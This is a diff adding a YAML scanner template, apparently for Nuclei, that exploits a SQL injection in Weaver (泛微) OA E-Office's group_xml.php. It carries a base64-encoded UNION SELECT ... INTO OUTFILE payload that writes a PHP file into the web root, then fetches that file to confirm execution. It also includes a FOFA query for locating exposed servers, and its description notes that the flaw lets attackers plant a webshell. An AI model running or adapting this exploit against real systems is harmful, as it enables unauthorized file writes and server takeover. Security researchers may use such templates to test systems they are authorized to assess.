@@ -1,0 +1,40 @@
+id: poc-local-oa-weaver-eoffice-group_xml-SQLinject-getshell
+
+info:
+  name: 泛微OA E-Office group_xml.php SQL注入漏洞
+  author: capiton
+  severity: critical
+  description: 泛微OA E-Office group_xml.php文件存在SQL注入漏洞，攻击者通过漏洞可以写入Webshell文件获取服务器权限
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Office%20group_xml.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+  metadata:
+    fofa-query: app="泛微-EOffice"
+    Vulnerability-Impact: 泛微OA E-Office 8
+  tags: weaver,ecology,fanwei,eoffice
+
+variables:
+  randomInt: "{{rand_int(100000,999999)}}"
+  md5_randomPayload: "{{md5(randomInt)}}"
+  payload: "[group]:[1]|[groupid]:[1 union select '<?php echo md5({{randomInt}});?>',2,3,4,5,6,7,8 into outfile '../webroot/{{randstr}}.php']"
+  base64_payload: "{{base64(payload)}}"
+
+requests:
+  - method: GET
+    path:
+      - "{{RootURL}}/inc/group_user_list/group_xml.php?par={{base64_payload}}"
+      - "{{RootURL}}/{{randstr}}.php"
+
+
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        condition: and
+        status:
+          - 200
+
+      - type: word
+        part: body
+        condition: and   
+        words:  
+          - "{{md5_randomPayload}}"
